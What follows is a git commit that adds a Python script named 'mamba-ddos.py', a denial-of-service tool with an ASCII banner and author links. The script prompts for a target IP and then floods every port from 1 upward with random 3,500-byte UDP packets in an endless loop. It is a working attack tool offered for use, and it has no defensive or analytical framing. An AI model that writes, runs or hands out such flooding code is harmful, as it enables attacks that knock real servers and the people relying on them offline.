190fbd324ec7fc29a70abe9003731ec72e831b6d
mamba-9mm <137858211+mamba-9mm@users.noreply.github.com>
2023-12-19 20:49:04 +0800

    Add files via upload

---
+++ mamba-ddos.py
@@ -0,0 +1,44 @@
+#Author MAMBA-9MM'
+import socket
+import os
+import random
+import time
+
+B = '\033[1m'
+R = '\033[31m'
+N = '\033[0m'
+
+white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(3500)
+
+os.system("clear")
+print(" ")
+print("                                  $ \                            $ \       $ \                    ")
+print("                                  $$ |                          $$ |      $$ |                    ")
+print(" $$$  $$$\   $$$$$$\   $$$  $$$\  $$$$$$     $$$$$$\        $$$$$$ | $$$$$$$ | $$$$$$\   $$$$$$$\ ")
+print("$$  $$  $$\  \____$$\ $$  $$  $$\ $$  __$$ \ \____$$\     $$  __$$ |$$  __$$ |$$  __$$\ $$  _____|")
+print("$$  $$  $$ | $$$$$$$ |$$  $$  $$ |$$ |  $$ | $$$$$$$ |    $$ /  $$ |$$ /  $$ |$$ /  $$ |\$$$$$$\  ")
+print("$$      $$ |$$  __$$ |$$      $$ |$$ |  $$ |$$  __$$ |    $$ |  $$ |$$ |  $$ |$$ |  $$ | \____$$\ ")
+print("$$ |    $$ |\$$$$$$$ |$$ |    $$ |$$$$$$$ / \$$$$$$$ |    \$$$$$$$ |\$$$$$$$ |\$$$$$$  |$$$$$$$  |")
+print("\__|   \___| \_______|\__|   \___|\______/   \_______|     \_______| \_______| \______/ \_______/ ")
+print()
+print("[" + B + "" + R + "#" + N + "] " + B + "" + R + "Author : MAMBA-9MM" + N + "   Mamba DDoS From - " + B + "" + R + "MAMBA MENTALITY" + N)
+print()
+print("\033[32m================================================================\033[0m")
+print("\033[32mTool Created : mamba-9mm\033[0m")
+print("\033[33mGithub       : https://github.com/mamba-9mm/\033[0m")
+print("\033[33mFacebook     : https://facebook.com/mambamentality9mm/\033[0m")
+print("\033[32m================================================================\033[0m")
+print()
+ip = input("[+] Target's IP : ")
+os.system("clear")
+print("Attack starting...")
+time.sleep(3)
+while True:
+    sent = 0
+    for port in range(1, 65534):
+        white.sendto(bytes, (ip, port))
+        sent = sent + 1
+        print("\033[1;91mSend \033[1;32m%s \033[1;91m Packets to \033[1;32m%s \033[1;91mThrough port \033[1;32m%s " % (sent, ip, port))
+
+print("\033[1;92mAttack finished\033[0m")
